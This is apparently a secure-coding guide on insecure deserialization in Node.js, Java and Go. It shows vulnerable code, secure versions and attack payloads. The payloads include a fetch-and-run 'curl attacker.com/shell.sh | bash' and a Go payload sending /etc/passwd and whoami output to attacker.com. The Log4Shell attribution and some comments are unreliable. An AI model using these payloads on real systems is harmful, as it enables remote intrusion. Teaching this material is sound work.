Using node-serialize or similar serialization libraries that can deserialize arbitrary JavaScript is extremely dangerous and can lead to Remote Code Execution (RCE). This vulnerability was exploited extensively in 2023 attacks against Node.js applications.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const serialize = require('node-serialize');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());
app.use(express.json());

// DANGEROUS: Deserializing untrusted user data
app.get('/profile', (req, res) => {
  const sessionCookie = req.cookies.session;

  if (sessionCookie) {
    // VULNERABLE: Deserializes arbitrary JavaScript from cookie
    const sessionData = serialize.unserialize(
      Buffer.from(sessionCookie, 'base64').toString()
    );

    res.json({
      username: sessionData.username,
      preferences: sessionData.preferences
    });
  } else {
    res.status(401).json({ error: 'No session' });
  }
});

app.listen(3000);
```

**Attack Payload**:
```javascript
// Malicious serialized object with IIFE (Immediately Invoked Function Expression)
const maliciousPayload = {
  rce: function() {
    require('child_process').execSync('curl https://attacker.com/shell.sh | bash');
  }
};

// The payload uses _$$ND_FUNC$$_ to trigger function execution
const exploit = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'id > /tmp/pwned\')}()"}';

// Base64 encode and send as cookie
// session=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ2lkID4gL3RtcC9wd25lZCcpfSgpIn0=
```

**Why This Is Dangerous**:
- node-serialize's unserialize() can execute JavaScript functions embedded in serialized data
- The `_$$ND_FUNC$$_` prefix triggers immediate function execution during deserialization
- Attacker gains full RCE with the privileges of the Node.js process
- No user interaction required beyond the application processing the malicious cookie

**SECURE VERSION**:

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const Joi = require('joi');

const app = express();
app.use(cookieParser());
app.use(express.json());

// Use environment variable for JWT secret
const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET || JWT_SECRET.length < 32) {
  throw new Error('JWT_SECRET must be set and at least 32 characters');
}

// Schema validation for session data
const sessionSchema = Joi.object({
  userId: Joi.string().uuid().required(),
  username: Joi.string().alphanum().min(3).max(30).required(),
  preferences: Joi.object({
    theme: Joi.string().valid('light', 'dark'),
    language: Joi.string().length(2)
  })
});

// SECURE: Using JWT for session data
app.get('/profile', (req, res) => {
  const sessionToken = req.cookies.session;

  if (!sessionToken) {
    return res.status(401).json({ error: 'No session' });
  }

  try {
    // Verify JWT signature - prevents tampering
    const decoded = jwt.verify(sessionToken, JWT_SECRET, {
      algorithms: ['HS256'],  // Explicitly specify allowed algorithms
      maxAge: '1h'  // Reject expired tokens
    });

    // Validate the decoded data structure
    const { error, value } = sessionSchema.validate(decoded.data);
    if (error) {
      console.warn('Invalid session data structure:', error.message);
      return res.status(400).json({ error: 'Invalid session data' });
    }

    res.json({
      username: value.username,
      preferences: value.preferences
    });
  } catch (err) {
    console.warn('JWT verification failed:', err.message);
    res.status(401).json({ error: 'Invalid session' });
  }
});

app.listen(3000);
```

**Key Security Controls**:
- **JWT with signature verification**: Data cannot be tampered with without invalidating the signature
- **Schema validation with Joi**: Even after JWT verification, validate data structure to prevent logic bugs
- **Algorithm specification**: Explicitly specifying 'HS256' prevents algorithm confusion attacks
- **No code execution**: JSON.parse (used internally by jwt.verify) cannot execute JavaScript code

For complex object serialization in inter-service communication, you need a carefully designed approach that separates data from behavior. Never serialize executable code or rely on type coercion during deserialization.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const Ajv = require('ajv');
const crypto = require('crypto');
const { promisify } = require('util');

const app = express();
app.use(express.json({ limit: '100kb' }));

// HMAC signing for inter-service messages
const SIGNING_KEY = Buffer.from(process.env.SERVICE_SIGNING_KEY, 'hex');
if (SIGNING_KEY.length < 32) {
  throw new Error('SIGNING_KEY must be at least 256 bits');
}

// JSON Schema for strict type validation
const ajv = new Ajv({ allErrors: true, removeAdditional: true });

const orderSchema = {
  type: 'object',
  additionalProperties: false,
  required: ['orderId', 'userId', 'items', 'timestamp'],
  properties: {
    orderId: { type: 'string', pattern: '^[a-f0-9]{24}$' },
    userId: { type: 'string', format: 'uuid' },
    items: {
      type: 'array',
      maxItems: 100,
      items: {
        type: 'object',
        additionalProperties: false,
        required: ['productId', 'quantity', 'price'],
        properties: {
          productId: { type: 'string', pattern: '^[A-Z]{3}[0-9]{6}$' },
          quantity: { type: 'integer', minimum: 1, maximum: 999 },
          price: { type: 'number', minimum: 0, maximum: 999999.99 }
        }
      }
    },
    timestamp: { type: 'integer', minimum: 1600000000000 },
    metadata: {
      type: 'object',
      additionalProperties: false,
      properties: {
        source: { type: 'string', enum: ['web', 'mobile', 'api'] },
        version: { type: 'string', pattern: '^[0-9]+\\.[0-9]+\\.[0-9]+$' }
      }
    }
  }
};

const validateOrder = ajv.compile(orderSchema);

// Secure message envelope with integrity protection
class SecureMessage {
  static sign(payload, expiresInMs = 300000) {
    const envelope = {
      payload: payload,
      timestamp: Date.now(),
      expires: Date.now() + expiresInMs,
      nonce: crypto.randomBytes(16).toString('hex')
    };

    const dataToSign = JSON.stringify(envelope);
    const signature = crypto
      .createHmac('sha256', SIGNING_KEY)
      .update(dataToSign)
      .digest('hex');

    return {
      data: Buffer.from(dataToSign).toString('base64'),
      signature: signature
    };
  }

  static verify(message) {
    const { data, signature } = message;

    if (!data || !signature) {
      throw new Error('Invalid message format');
    }

    // Verify signature using timing-safe comparison
    const dataBuffer = Buffer.from(data, 'base64');
    const expectedSignature = crypto
      .createHmac('sha256', SIGNING_KEY)
      .update(dataBuffer)
      .digest('hex');

    if (!crypto.timingSafeEqual(
      Buffer.from(signature, 'hex'),
      Buffer.from(expectedSignature, 'hex')
    )) {
      throw new Error('Invalid signature');
    }

    // Parse after signature verification
    const envelope = JSON.parse(dataBuffer.toString());

    // Check expiration
    if (Date.now() > envelope.expires) {
      throw new Error('Message expired');
    }

    // Check timestamp not too far in the past (replay protection)
    const MAX_AGE = 600000; // 10 minutes
    if (Date.now() - envelope.timestamp > MAX_AGE) {
      throw new Error('Message too old');
    }

    return envelope.payload;
  }
}

// Nonce storage for replay protection
const usedNonces = new Map();
const NONCE_EXPIRY = 600000; // 10 minutes

function checkReplay(nonce) {
  // Cleanup old nonces periodically
  const now = Date.now();
  for (const [key, timestamp] of usedNonces) {
    if (now - timestamp > NONCE_EXPIRY) {
      usedNonces.delete(key);
    }
  }

  if (usedNonces.has(nonce)) {
    return false;
  }
  usedNonces.set(nonce, now);
  return true;
}

// Inter-service endpoint with full protection
app.post('/internal/orders', async (req, res) => {
  const requestId = crypto.randomUUID();
  const startTime = Date.now();

  try {
    // Layer 1: Verify message integrity
    const payload = SecureMessage.verify(req.body);

    // Layer 2: Validate against strict schema
    const valid = validateOrder(payload);
    if (!valid) {
      console.warn(`[${requestId}] Schema validation failed:`, validateOrder.errors);
      return res.status(400).json({
        error: 'Validation failed',
        requestId: requestId
      });
    }

    // Layer 3: Business logic validation
    const order = reconstructOrder(payload);

    // Layer 4: Audit logging
    console.info(JSON.stringify({
      event: 'order_received',
      requestId: requestId,
      orderId: order.orderId,
      userId: order.userId,
      itemCount: order.items.length,
      processingTimeMs: Date.now() - startTime
    }));

    res.json({ success: true, orderId: order.orderId, requestId: requestId });

  } catch (err) {
    console.error(`[${requestId}] Processing failed:`, err.message);

    // Security: Don't leak internal error details
    const statusCode = err.message.includes('signature') ? 401 : 400;
    res.status(statusCode).json({
      error: 'Processing failed',
      requestId: requestId
    });
  }
});

// Reconstruct domain object from validated data (no deserialization)
function reconstructOrder(data) {
  return {
    orderId: data.orderId,
    userId: data.userId,
    items: data.items.map(item => ({
      productId: item.productId,
      quantity: item.quantity,
      price: item.price,
      // Methods are defined here, not deserialized
      getTotal() { return this.quantity * this.price; }
    })),
    createdAt: new Date(data.timestamp),
    getTotal() {
      return this.items.reduce((sum, item) => sum + item.getTotal(), 0);
    }
  };
}

app.listen(3000);
```

**Defense in Depth Layers**:

1. **Cryptographic Integrity (HMAC-SHA256)**:
```javascript
// Sign on sender side
const signed = SecureMessage.sign(orderData);
await fetch('http://order-service/internal/orders', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(signed)
});
```

2. **Strict JSON Schema Validation**:
```javascript
// additionalProperties: false rejects unexpected fields
// Explicit type and format constraints prevent type confusion
const schema = {
  additionalProperties: false,
  properties: {
    userId: { type: 'string', format: 'uuid' }  // Only valid UUIDs
  }
};
```

3. **Replay Protection with Nonces**:
```javascript
// Each message has unique nonce, stored and checked
if (!checkReplay(envelope.nonce)) {
  throw new Error('Replay attack detected');
}
```

**Additional Protections**:
- **Never use eval(), Function(), or vm.runInContext()** with untrusted data
- **Use Protocol Buffers or MessagePack** for binary serialization with strict schemas
- **Implement request size limits** to prevent DoS via large payloads
- **Use separate signing keys per service** for compartmentalization
- **Monitor for signature verification failures** as potential attack indicators
- **Implement circuit breakers** to prevent cascade failures from malformed messages

Using Java's native ObjectInputStream to deserialize untrusted data is one of the most dangerous security vulnerabilities in Java applications. This led to catastrophic breaches including the Log4Shell incident that affected millions of systems worldwide.

**VULNERABLE CODE**:

```java
import java.io.*;
import javax.servlet.http.*;
import java.util.Base64;

public class UserPreferencesServlet extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        // DANGEROUS: Deserializing untrusted data from client
        String encodedData = request.getParameter("preferences");
        byte[] serializedData = Base64.getDecoder().decode(encodedData);

        try (ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(serializedData))) {

            // CRITICAL VULNERABILITY: Arbitrary object instantiation
            UserPreferences prefs = (UserPreferences) ois.readObject();

            // Process preferences
            processPreferences(prefs);

            response.getWriter().write("Preferences updated successfully");

        } catch (ClassNotFoundException e) {
            response.sendError(500, "Invalid data format");
        }
    }

    private void processPreferences(UserPreferences prefs) {
        // Business logic here
    }
}
```

**Attack Payload** (using ysoserial tool):
```bash
# Generate malicious serialized object using CommonsCollections gadget chain
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/shell.sh | bash' | base64 -w0

# Send to vulnerable endpoint
curl -X POST http://target.com/api/preferences \
  -d "preferences=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAABc3IAMG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKoo9hIEAbxAIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADZm9vc3I..."
```

**Why This Is Dangerous**:
- Java deserialization executes code BEFORE type checking occurs
- Gadget chains in common libraries (Commons Collections, Spring, etc.) enable RCE
- The cast to `UserPreferences` happens AFTER malicious code has already executed
- Attacker can execute arbitrary system commands, install backdoors, or exfiltrate data

**SECURE VERSION**:

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.DeserializationFeature;
import javax.servlet.http.*;
import java.io.IOException;
import java.util.logging.Logger;

public class SecureUserPreferencesServlet extends HttpServlet {

    private static final Logger LOGGER = Logger.getLogger(
        SecureUserPreferencesServlet.class.getName());

    private final ObjectMapper objectMapper;

    public SecureUserPreferencesServlet() {
        this.objectMapper = new ObjectMapper();
        // Disable dangerous features
        this.objectMapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES);
        // Prevent polymorphic deserialization attacks
        this.objectMapper.deactivateDefaultTyping();
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        String jsonData = request.getParameter("preferences");

        // Input validation
        if (jsonData == null || jsonData.length() > 10000) {
            LOGGER.warning("Invalid preferences data from: " + request.getRemoteAddr());
            response.sendError(400, "Invalid request");
            return;
        }

        try {
            // SAFE: JSON deserialization to specific concrete type
            UserPreferencesDTO prefs = objectMapper.readValue(
                jsonData, UserPreferencesDTO.class);

            // Validate DTO fields
            if (!isValidPreferences(prefs)) {
                response.sendError(400, "Invalid preferences values");
                return;
            }

            processPreferences(prefs);

            LOGGER.info("Preferences updated for user from: " + request.getRemoteAddr());
            response.getWriter().write("Preferences updated successfully");

        } catch (Exception e) {
            LOGGER.severe("Deserialization error: " + e.getMessage());
            response.sendError(400, "Invalid data format");
        }
    }

    private boolean isValidPreferences(UserPreferencesDTO prefs) {
        return prefs.getTheme() != null && 
               prefs.getTheme().matches("^(light|dark|system)$") &&
               prefs.getLanguage() != null &&
               prefs.getLanguage().matches("^[a-z]{2}(-[A-Z]{2})?$");
    }

    private void processPreferences(UserPreferencesDTO prefs) {
        // Business logic with validated data
    }
}

// Immutable DTO with validated fields only
public final class UserPreferencesDTO {
    private String theme;
    private String language;
    private boolean notifications;

    // Getters and setters with validation
    public String getTheme() { return theme; }
    public void setTheme(String theme) { this.theme = theme; }
    public String getLanguage() { return language; }
    public void setLanguage(String language) { this.language = language; }
    public boolean isNotifications() { return notifications; }
    public void setNotifications(boolean notifications) { this.notifications = notifications; }
}
```

**Key Security Controls**:
- **Use JSON instead of Java serialization**: JSON parsers like Jackson don't execute arbitrary code during parsing
- **Deserialize to concrete types only**: Specify exact class, never use Object or polymorphic types
- **Disable default typing**: Prevents Jackson polymorphic deserialization vulnerabilities
- **Validate all fields after deserialization**: Defense in depth with explicit validation

If you must use Java serialization for legacy compatibility, you need multiple defense layers. Even with these protections, Java serialization remains inherently risky and should be phased out. Here's how to minimize the attack surface:

**PRODUCTION PATTERN**:

```java
import java.io.*;
import java.util.*;
import java.util.logging.Logger;
import javax.servlet.http.*;

public class SecureLegacySerializationServlet extends HttpServlet {

    private static final Logger LOGGER = Logger.getLogger(
        SecureLegacySerializationServlet.class.getName());

    // DEFENSE LAYER 1: Strict allowlist of permitted classes
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.mycompany.dto.UserPreferences",
        "com.mycompany.dto.UserSettings",
        "java.lang.String",
        "java.lang.Integer",
        "java.lang.Long",
        "java.lang.Boolean",
        "java.util.ArrayList",
        "java.util.HashMap"
    );

    // DEFENSE LAYER 2: Maximum object depth to prevent DoS
    private static final int MAX_DEPTH = 10;

    // DEFENSE LAYER 3: Maximum size limit
    private static final int MAX_SIZE_BYTES = 50_000;

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        String clientIP = request.getRemoteAddr();

        // DEFENSE LAYER 4: Rate limiting check
        if (!RateLimiter.checkLimit(clientIP, "deserialization", 10, 60000)) {
            LOGGER.warning("Rate limit exceeded for deserialization from: " + clientIP);
            response.sendError(429, "Too many requests");
            return;
        }

        String encodedData = request.getParameter("data");

        // DEFENSE LAYER 5: Input size validation
        if (encodedData == null || encodedData.length() > MAX_SIZE_BYTES) {
            LOGGER.warning("Oversized deserialization attempt from: " + clientIP);
            response.sendError(400, "Invalid request size");
            return;
        }

        byte[] serializedData;
        try {
            serializedData = Base64.getDecoder().decode(encodedData);
        } catch (IllegalArgumentException e) {
            response.sendError(400, "Invalid encoding");
            return;
        }

        try {
            // DEFENSE LAYER 6: Secure ObjectInputStream with allowlist
            Object result = safeDeserialize(serializedData);

            if (result instanceof UserPreferences) {
                UserPreferences prefs = (UserPreferences) result;

                // DEFENSE LAYER 7: Post-deserialization validation
                if (!validatePreferences(prefs)) {
                    LOGGER.warning("Invalid preferences content from: " + clientIP);
                    response.sendError(400, "Invalid preferences");
                    return;
                }

                processPreferences(prefs);

                // Audit logging
                AuditLogger.log("DESERIALIZATION_SUCCESS", clientIP, 
                    "Deserialized UserPreferences successfully");

                response.getWriter().write("Success");
            } else {
                response.sendError(400, "Unexpected data type");
            }

        } catch (SecurityException e) {
            LOGGER.severe("Blocked deserialization attack from " + clientIP + 
                ": " + e.getMessage());
            SecurityAlerts.sendAlert("DESERIALIZATION_ATTACK", clientIP, e.getMessage());
            response.sendError(400, "Invalid data");
        } catch (Exception e) {
            LOGGER.warning("Deserialization failed from " + clientIP);
            response.sendError(400, "Processing error");
        }
    }

    private Object safeDeserialize(byte[] data) throws IOException, ClassNotFoundException {
        try (ValidatingObjectInputStream vois = new ValidatingObjectInputStream(
                new ByteArrayInputStream(data))) {
            return vois.readObject();
        }
    }

    // Custom ObjectInputStream with class allowlist
    private class ValidatingObjectInputStream extends ObjectInputStream {

        private int depth = 0;

        public ValidatingObjectInputStream(InputStream in) throws IOException {
            super(in);
            // Enable filtering (Java 9+)
            setObjectInputFilter(this::filterCheck);
        }

        // Java 9+ ObjectInputFilter
        private ObjectInputFilter.Status filterCheck(ObjectInputFilter.FilterInfo info) {

            // Check depth
            if (info.depth() > MAX_DEPTH) {
                LOGGER.warning("Object depth exceeded: " + info.depth());
                return ObjectInputFilter.Status.REJECTED;
            }

            // Check array size
            if (info.arrayLength() > 1000) {
                LOGGER.warning("Array size exceeded: " + info.arrayLength());
                return ObjectInputFilter.Status.REJECTED;
            }

            Class<?> clazz = info.serialClass();
            if (clazz == null) {
                return ObjectInputFilter.Status.UNDECIDED;
            }

            String className = clazz.getName();

            // Allowlist check
            if (ALLOWED_CLASSES.contains(className)) {
                return ObjectInputFilter.Status.ALLOWED;
            }

            // Reject known dangerous classes explicitly
            if (isDangerousClass(className)) {
                LOGGER.severe("Blocked dangerous class: " + className);
                return ObjectInputFilter.Status.REJECTED;
            }

            // Reject anything not on allowlist
            LOGGER.warning("Rejected unlisted class: " + className);
            return ObjectInputFilter.Status.REJECTED;
        }

        private boolean isDangerousClass(String className) {
            // Known gadget chain classes
            return className.contains("org.apache.commons.collections") ||
                   className.contains("org.springframework") ||
                   className.contains("com.sun.rowset") ||
                   className.contains("javax.management") ||
                   className.contains("java.lang.Runtime") ||
                   className.contains("java.lang.ProcessBuilder") ||
                   className.contains("org.codehaus.groovy") ||
                   className.contains("bsh.Interpreter") ||
                   className.contains("org.mozilla.javascript");
        }
    }

    private boolean validatePreferences(UserPreferences prefs) {
        // Strict validation of all fields
        return prefs != null &&
               prefs.getTheme() != null &&
               prefs.getTheme().length() < 50 &&
               prefs.getTheme().matches("^[a-zA-Z0-9_-]+$");
    }

    private void processPreferences(UserPreferences prefs) {
        // Business logic
    }
}

// Utility classes
class RateLimiter {
    private static final Map<String, List<Long>> requests = new HashMap<>();

    public static synchronized boolean checkLimit(String key, String action, 
            int maxRequests, long windowMs) {
        String fullKey = key + ":" + action;
        long now = System.currentTimeMillis();

        requests.putIfAbsent(fullKey, new ArrayList<>());
        List<Long> timestamps = requests.get(fullKey);

        // Remove old entries
        timestamps.removeIf(t -> now - t > windowMs);

        if (timestamps.size() >= maxRequests) {
            return false;
        }

        timestamps.add(now);
        return true;
    }
}

class SecurityAlerts {
    public static void sendAlert(String type, String source, String details) {
        // Send to SIEM/security team
        Logger.getLogger("SECURITY").severe(
            String.format("ALERT [%s] from %s: %s", type, source, details));
    }
}

class AuditLogger {
    public static void log(String action, String source, String details) {
        Logger.getLogger("AUDIT").info(
            String.format("%s from %s: %s", action, source, details));
    }
}
```

**Defense in Depth Layers**:

1. **Class Allowlist (Critical)**:
```java
// Only permit specific, known-safe classes
private static final Set<String> ALLOWED_CLASSES = Set.of(
    "com.mycompany.dto.UserPreferences",
    "java.lang.String"
);
```

2. **ObjectInputFilter (Java 9+)**:
```java
// JVM-level protection with depth and size limits
setObjectInputFilter(info -> {
    if (info.depth() > MAX_DEPTH) return REJECTED;
    if (info.arrayLength() > 1000) return REJECTED;
    return ALLOWED_CLASSES.contains(info.serialClass().getName()) 
        ? ALLOWED : REJECTED;
});
```

3. **Dangerous Class Blocklist**:
```java
// Explicitly block known gadget chain classes
if (className.contains("org.apache.commons.collections") ||
    className.contains("java.lang.ProcessBuilder")) {
    return ObjectInputFilter.Status.REJECTED;
}
```

**Additional Protections**:

- **JEP 290 Global Filter**: Set JVM-wide deserialization filter in `conf/security/java.security`:
```properties
jdk.serialFilter=maxarray=1000;maxdepth=10;!org.apache.commons.collections.**;!com.sun.rowset.**
```

- **Remove dangerous libraries**: Exclude or update vulnerable dependencies:
```xml
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-collections4</artifactId>
    <version>4.4</version> <!-- Patched version -->
</dependency>
```

- **Network segmentation**: Isolate services handling serialization from critical systems

- **Migration plan**: Document path to JSON/Protocol Buffers for future deprecation

**CRITICAL WARNING**: Even with all these protections, Java native serialization should be considered deprecated for untrusted data. New gadget chains are discovered regularly. Plan migration to safer alternatives (JSON, Protocol Buffers, Avro) as soon as feasible.

While Go's `encoding/json` is safer than many languages' serialization libraries, improper use can still lead to serious vulnerabilities including type confusion, resource exhaustion, and arbitrary code execution when combined with reflection or plugin systems.

**VULNERABLE CODE**:

```go
package main

import (
	"encoding/gob"
	"encoding/json"
	"net/http"
	"os/exec"
	"reflect"
)

// Dangerous: Dynamic type registry allowing arbitrary type instantiation
var typeRegistry = make(map[string]reflect.Type)

func init() {
	// Registering types including dangerous ones
	typeRegistry["Command"] = reflect.TypeOf(CommandAction{})
	typeRegistry["User"] = reflect.TypeOf(User{})
}

type CommandAction struct {
	Cmd  string   `json:"cmd"`
	Args []string `json:"args"`
}

func (c *CommandAction) Execute() (string, error) {
	// DANGEROUS: Executes arbitrary commands
	out, err := exec.Command(c.Cmd, c.Args...).Output()
	return string(out), err
}

type User struct {
	ID   int    `json:"id"`
	Name string `json:"name"`
}

type Message struct {
	Type    string          `json:"type"`
	Payload json.RawMessage `json:"payload"`
}

func handleMessage(w http.ResponseWriter, r *http.Request) {
	var msg Message
	// VULNERABLE: No size limit on input
	if err := json.NewDecoder(r.Body).Decode(&msg); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// VULNERABLE: User controls which type gets instantiated
	typ, ok := typeRegistry[msg.Type]
	if !ok {
		http.Error(w, "Unknown type", http.StatusBadRequest)
		return
	}

	instance := reflect.New(typ).Interface()
	if err := json.Unmarshal(msg.Payload, instance); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// VULNERABLE: Executing methods on attacker-controlled objects
	if executor, ok := instance.(interface{ Execute() (string, error) }); ok {
		result, _ := executor.Execute()
		w.Write([]byte(result))
	}
}
```

**Attack Payload**:
```json
{
  "type": "Command",
  "payload": {
    "cmd": "/bin/sh",
    "args": ["-c", "cat /etc/passwd; curl https://attacker.com/exfil?data=$(whoami)"]
  }
}
```

**Why This Is Dangerous**:
- Attacker controls which type gets instantiated via the `type` field
- No validation of command execution - leads to RCE
- No input size limits - enables DoS via memory exhaustion
- Gob encoding (also registered) is especially dangerous as it can invoke arbitrary code during deserialization

**SECURE VERSION**:

```go
package main

import (
	"encoding/json"
	"errors"
	"io"
	"log"
	"net/http"
	"regexp"
)

// Strict allowlist of safe types - no executable types
type SafeMessageType string

const (
	MessageTypeUser    SafeMessageType = "user"
	MessageTypeProfile SafeMessageType = "profile"
)

// Only data-only structs, no methods that execute code
type User struct {
	ID   int    `json:"id"`
	Name string `json:"name"`
}

type Profile struct {
	UserID int    `json:"user_id"`
	Bio    string `json:"bio"`
}

type Message struct {
	Type    SafeMessageType `json:"type"`
	Payload json.RawMessage `json:"payload"`
}

const maxBodySize = 1024 * 1024 // 1MB limit

var validNamePattern = regexp.MustCompile(`^[a-zA-Z0-9\s]{1,100}$`)

func handleMessageSecure(w http.ResponseWriter, r *http.Request) {
	// SECURE: Limit request body size
	r.Body = http.MaxBytesReader(w, r.Body, maxBodySize)

	var msg Message
	decoder := json.NewDecoder(r.Body)
	decoder.DisallowUnknownFields() // Reject unexpected fields

	if err := decoder.Decode(&msg); err != nil {
		log.Printf("Decode error from %s: %v", r.RemoteAddr, err)
		http.Error(w, "Invalid request format", http.StatusBadRequest)
		return
	}

	// SECURE: Explicit type switch, not dynamic dispatch
	switch msg.Type {
	case MessageTypeUser:
		var user User
		if err := unmarshalAndValidate(msg.Payload, &user); err != nil {
			http.Error(w, "Invalid user data", http.StatusBadRequest)
			return
		}
		// Safe processing of validated data
		processUser(w, &user)

	case MessageTypeProfile:
		var profile Profile
		if err := unmarshalAndValidate(msg.Payload, &profile); err != nil {
			http.Error(w, "Invalid profile data", http.StatusBadRequest)
			return
		}
		processProfile(w, &profile)

	default:
		log.Printf("Unknown message type from %s: %s", r.RemoteAddr, msg.Type)
		http.Error(w, "Unknown message type", http.StatusBadRequest)
	}
}

func unmarshalAndValidate(data json.RawMessage, v interface{}) error {
	if len(data) > 10*1024 { // 10KB limit per payload
		return errors.New("payload too large")
	}

	decoder := json.NewDecoder(io.LimitReader(
		&jsonRawMessageReader{data: data},
		int64(len(data)),
	))
	decoder.DisallowUnknownFields()

	if err := decoder.Decode(v); err != nil {
		return err
	}

	return validateStruct(v)
}

type jsonRawMessageReader struct {
	data json.RawMessage
	pos  int
}

func (r *jsonRawMessageReader) Read(p []byte) (n int, err error) {
	if r.pos >= len(r.data) {
		return 0, io.EOF
	}
	n = copy(p, r.data[r.pos:])
	r.pos += n
	return n, nil
}

func validateStruct(v interface{}) error {
	switch val := v.(type) {
	case *User:
		if val.ID <= 0 || val.ID > 1000000 {
			return errors.New("invalid user ID")
		}
		if !validNamePattern.MatchString(val.Name) {
			return errors.New("invalid name format")
		}
	case *Profile:
		if val.UserID <= 0 {
			return errors.New("invalid user ID")
		}
		if len(val.Bio) > 500 {
			return errors.New("bio too long")
		}
	}
	return nil
}

func processUser(w http.ResponseWriter, u *User) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "user processed"})
}

func processProfile(w http.ResponseWriter, p *Profile) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "profile processed"})
}
```

**Key Security Controls**:
- **Explicit type allowlist**: Uses type switch instead of dynamic type registry - attacker cannot instantiate arbitrary types
- **Input size limits**: `MaxBytesReader` prevents memory exhaustion DoS attacks
- **DisallowUnknownFields**: Rejects payloads with unexpected fields that might indicate exploitation attempts
- **Post-deserialization validation**: Validates all field values against business rules after parsing

Plugin systems and binary serialization formats like `gob` are high-risk areas that require defense in depth. Gob can execute arbitrary code during deserialization through registered types' `GobDecode` methods. Here's a production-hardened approach.

**PRODUCTION PATTERN**:

```go
package main

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/gob"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"sync"
	"time"
)

// ===============================================
// LAYER 1: Cryptographic Integrity Verification
// ===============================================

type SecureSerializer struct {
	hmacKey []byte
	mu      sync.RWMutex
}

func NewSecureSerializer(key []byte) *SecureSerializer {
	if len(key) < 32 {
		panic("HMAC key must be at least 32 bytes")
	}
	return &SecureSerializer{hmacKey: key}
}

type SignedPayload struct {
	Data      []byte `json:"data"`
	Signature string `json:"sig"`
	Timestamp int64  `json:"ts"`
	Version   int    `json:"v"`
}

const (
	maxPayloadAge   = 5 * time.Minute
	currentVersion  = 1
	maxPayloadBytes = 512 * 1024 // 512KB
)

func (s *SecureSerializer) sign(data []byte) string {
	h := hmac.New(sha256.New, s.hmacKey)
	h.Write(data)
	return base64.StdEncoding.EncodeToString(h.Sum(nil))
}

func (s *SecureSerializer) verify(data []byte, signature string) bool {
	expected := s.sign(data)
	// Constant-time comparison to prevent timing attacks
	return hmac.Equal([]byte(expected), []byte(signature))
}

func (s *SecureSerializer) Serialize(v interface{}) ([]byte, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	var buf bytes.Buffer
	enc := gob.NewEncoder(&buf)
	if err := enc.Encode(v); err != nil {
		return nil, fmt.Errorf("gob encode failed: %w", err)
	}

	data := buf.Bytes()
	if len(data) > maxPayloadBytes {
		return nil, errors.New("payload exceeds maximum size")
	}

	payload := SignedPayload{
		Data:      data,
		Signature: s.sign(data),
		Timestamp: time.Now().Unix(),
		Version:   currentVersion,
	}

	return json.Marshal(payload)
}

func (s *SecureSerializer) Deserialize(raw []byte, v interface{}) error {
	s.mu.RLock()
	defer s.mu.RUnlock()

	// Size check before any parsing
	if len(raw) > maxPayloadBytes+1024 { // Allow overhead for envelope
		return errors.New("payload too large")
	}

	var payload SignedPayload
	if err := json.Unmarshal(raw, &payload); err != nil {
		return fmt.Errorf("envelope parse failed: %w", err)
	}

	// LAYER 1: Version check
	if payload.Version != currentVersion {
		return fmt.Errorf("unsupported version: %d", payload.Version)
	}

	// LAYER 2: Timestamp freshness
	age := time.Since(time.Unix(payload.Timestamp, 0))
	if age > maxPayloadAge || age < -30*time.Second {
		return errors.New("payload expired or from future")
	}

	// LAYER 3: HMAC verification BEFORE deserialization
	if !s.verify(payload.Data, payload.Signature) {
		log.Printf("SECURITY: HMAC verification failed, potential tampering")
		return errors.New("signature verification failed")
	}

	// LAYER 4: Size check on inner data
	if len(payload.Data) > maxPayloadBytes {
		return errors.New("inner payload too large")
	}

	// Only deserialize AFTER signature verification
	dec := gob.NewDecoder(bytes.NewReader(payload.Data))
	if err := dec.Decode(v); err != nil {
		return fmt.Errorf("gob decode failed: %w", err)
	}

	return nil
}

// ===============================================
// LAYER 2: Safe Type Registration
// ===============================================

// Only register types with NO side effects in GobDecode/GobEncode
// NEVER register types that can execute code
func init() {
	// Safe data-only types
	gob.Register(&SafeTask{})
	gob.Register(&SafeResult{})
	// DO NOT register: os/exec.Cmd, reflect types, function types
}

type SafeTask struct {
	ID        string    `json:"id"`
	TaskType  string    `json:"type"` // Validated against allowlist
	Payload   []byte    `json:"payload"`
	CreatedAt time.Time `json:"created_at"`
}

type SafeResult struct {
	TaskID    string    `json:"task_id"`
	Status    string    `json:"status"`
	Output    []byte    `json:"output"`
	CompletedAt time.Time `json:"completed_at"`
